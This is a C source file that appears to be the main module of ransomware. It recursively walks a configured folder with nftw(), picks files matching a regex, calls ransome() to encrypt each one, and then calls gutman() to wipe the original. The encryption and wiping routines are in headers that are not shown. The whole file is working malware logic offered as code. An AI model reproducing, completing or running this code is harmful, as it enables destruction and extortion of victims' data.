#include "config.h"
#include "melcrypt.h"

//#define _XOPEN_SOURCE 1			/* Required under GLIBC for nftw() */
#define _XOPEN_SOURCE_EXTENDED 1	/* Same */

#include <stdio.h>
#include <errno.h>
#include <ftw.h>	// gets <sys/types.h> and <sys/stat.h> for us */
#include <limits.h>	// for PATH_MAX */
#include <unistd.h>	// for getdtablesize(), getcwd() declarations */

#include <stdlib.h>
#include <string.h>
#include <regex.h>

//	fds for use by other functions, see text
#define SPARE_FDS 5	

//	The following is the size of a buffer to contain any error messages
//	encountered when the regular expression is compiled.
#define MAX_ERROR_MSG 0x1000

extern int process(const char *file, const struct stat *sb,
		   int flag, struct FTW *s);

static int compile_regex (regex_t * r, const char * regex_text)
{
//	regcomp() is used to compile a regular expression into a form that is
//  suitable for subsequent regexec() searches.    
    int status = regcomp (r, regex_text, REG_EXTENDED|REG_NEWLINE);
    if (status != 0) {
	char error_message[MAX_ERROR_MSG];
	regerror (status, r, error_message, MAX_ERROR_MSG);
        printf ("Regex error compiling '%s': %s\n",
                 regex_text, error_message);
        return 1;
    }
    return 0;
}

//  Match the string in "to_match" against the compiled regular
//  expression in "r".
static int match_regex (regex_t * r, const char * to_match)
{
//	"P" is a pointer into the string which points to the end of the
//	previous match. 
    const char * p = to_match;
    
//	"N_matches" is the maximum number of matches allowed.
    const int n_matches = NFILES;
    
//	"M" contains the matches found.
    regmatch_t m[n_matches];

    int i = 0;
//  regexec() is used to match a null-terminated string against the
//  precompiled pattern buffer, preg.  nmatch and pmatch are used to
//  provide information regarding the location of any matches.  eflags
//  may be the bitwise-or of one or both of REG_NOTBOL and REG_NOTEOL
//	which cause changes in matching behavior described below.    
    int nomatch = regexec (r, p, n_matches, m, 0);
    if (nomatch) {
       printf ("No more matches.\n");
        return nomatch;
    }
	printf("%s\n", to_match);
	
//	call ransome to encrypt files, see melcrypt.h
	ransome(to_match);
	
//	call gutman to delete files, see gutman.h
	gutman(to_match);
	
    return 0;
}

//	main --- call nftw() on each command-line argument 
int main(int argc, char **argv)
{
	int i, c, nfds;
	int errors = 0;
	int flags = FTW_PHYS;
	flags |= FTW_CHDIR;

//	leave some spare descriptors 
	nfds = getdtablesize() - SPARE_FDS;	

//	http://man7.org/linux/man-pages/man3/nftw.3p.html
	if (nftw(FOLDER, process, nfds, flags) != 0) {
		errors++;
	}


	return (errors != 0);
}


int process(const char *file, const struct stat *sb,
	    int flag, struct FTW *s)
{
	char dir[PATH_MAX],fi[PATH_MAX];
	int retval = 0;
	const char *name = file + s->base;
	
	if(flag==FTW_F){
		regex_t r;
//	REGEX is a macro in config.h
		const char * regex_text=REGEXP;
	
//	http://man7.org/linux/man-pages/man2/getcwd.2.html
//  The getcwd() function copies an absolute pathname of the current
//  working directory to the array pointed to by buf, which is of length
//  size.
		getcwd(dir, sizeof dir);
		snprintf (fi, PATH_MAX,"%s/%s", dir, name);	

//	http://man7.org/linux/man-pages/man3/regcomp.3.html		
		compile_regex (& r, regex_text);		
		match_regex (& r, fi);
//  Supplying regfree() with a precompiled pattern buffer, preg will free
//	the memory allocated to the pattern buffer by the compiling process,
//	regcomp().				
		regfree (& r);
		
	}

	return retval;
}

